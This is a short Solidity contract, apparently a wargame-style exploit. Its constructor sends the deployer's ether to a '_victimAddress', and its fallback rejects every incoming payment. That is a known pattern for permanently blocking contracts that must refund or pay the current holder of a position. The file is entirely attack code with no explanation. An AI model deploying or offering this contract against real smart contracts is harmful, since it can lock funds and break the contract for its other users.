// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Testing {
    constructor(address _victimAddress) public payable {
        address(_victimAddress).call{value: msg.value}("");
    }

    fallback() external payable {
        revert();
    }
}
